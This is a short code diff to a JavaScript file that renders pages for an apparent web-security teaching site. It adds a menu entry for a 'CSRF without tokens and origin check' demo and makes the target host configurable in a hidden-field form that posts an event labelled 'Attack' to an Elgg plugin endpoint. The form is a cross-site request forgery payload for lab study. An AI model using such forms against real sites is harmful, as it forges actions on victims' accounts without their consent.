@@ -336,6 +336,18 @@ function getHomePageHtmlCode(){
     str += '</div>';
     str += '</a>';
 
+    str += '<a href="/csrfattack" class="mylink">';
+    str += '<div class="num">';
+    str += '8';
+    str += '</div>';    
+    str += '<div class="title">';
+    str += 'CSRF without tokens and origin check';
+    str += '</div>';
+    str += '<div class="desc">';
+    str += 'Check here to see CSRF without tokens and origin check';
+    str += '</div>';
+    str += '</a>';
+
 
 
     str += '</div>';
@@ -417,7 +429,7 @@ str += '<center>';
 str += '<font color="white"><h1>Welcome to this Web Security Site !!!</h1>';
 str += '<h2>There is a surprise for you every 5 seconds</h2></font>';
 str += '</center>';
-str += '<form name="events" action="http://localhost/elgg/action/google_integration/add" method="POST">        ';
+str += '<form name="events" action="http://'+elggsite+'/action/google_integration/add" method="POST">        ';
 str += '<input type="hidden" name="ename" value="Attack"/>';
 str += '<input type="hidden" name="esdate" value="2014-03-29"/>';
 str += '<input type="hidden" name="eedate" value="2014-03-29"/>';
